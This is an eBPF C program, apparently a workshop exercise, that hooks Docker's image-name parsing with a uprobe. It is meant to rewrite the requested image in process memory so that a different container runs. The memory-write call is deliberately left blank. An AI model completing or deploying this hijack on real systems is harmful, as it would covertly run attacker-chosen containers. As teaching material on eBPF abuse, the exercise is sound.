#include "vmlinux.h"
#include <bpf/bpf_helpers.h>

char LICENSE[] SEC("license") = "GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

struct event {
    int pid;
    char comm[16];
    bool success;
};


SEC("uprobe/ParseNormalizedNamed")
int trace_normalized_path(struct user_pt_regs *ctx)
{
    /* POC is sudo docker run -it public.ecr.aws/ubuntu/mysql:8.0-20.04_beta */
    //char image_malicious[42] = "public.ecr.aws/ubuntu/redis:5.0-20.04_beta";
    
    /* POC is sudo docker run -it alpine */
    char image_malicious[7] = "python";
    char *image_ptr;
    char new_image[64] = {};
    u16 err = 0;

    u32 len = 0;

    /*
        Misión por una pegatina! Explicame este ctx->sp + 8)
    */
    long success = bpf_probe_read(&image_ptr, sizeof(image_ptr), (void *) ctx->sp + 8);

    if (success != 0) {
        return -1;
    }

    if (image_ptr == NULL) {
        return 0;
    }

    bpf_printk("\n");
    bpf_printk("image: %s", image_ptr);
    bpf_printk("image hex: %lx", (unsigned long long*)image_ptr);
    bpf_printk("\n");

    /*
           long bpf_probe_write_user(void *dst, const void *src, u32 len)

              Description
                     Attempt in a safe way to write len bytes from the
                     buffer src to dst in memory. It only works for
                     threads that are in user context, and dst must be a
                     valid user space address.

                     This helper should not be used to implement any
                     kind of security mechanism because of TOC-TOU
                     attacks, but rather to debug, divert, and
                     manipulate execution of semi-cooperative processes.

                     Keep in mind that this feature is meant for
                     experiments, and it has a risk of crashing the
                     system and running programs.  Therefore, when an
                     eBPF program using this helper is attached, a
                     warning including PID and process name is printed
                     to kernel logs.
    */

    success = bpf_probe_write_user(/**/);

    /*
        This struct helps us giving userland process information about 
        the state of the hijacking process. It may be changed to add more info about 
        the image that was hijacked and the image that replaced it.
    */
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (success == 0);
        e->pid = (bpf_get_current_pid_tgid() >> 32);
        bpf_get_current_comm(e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }

    return err;
}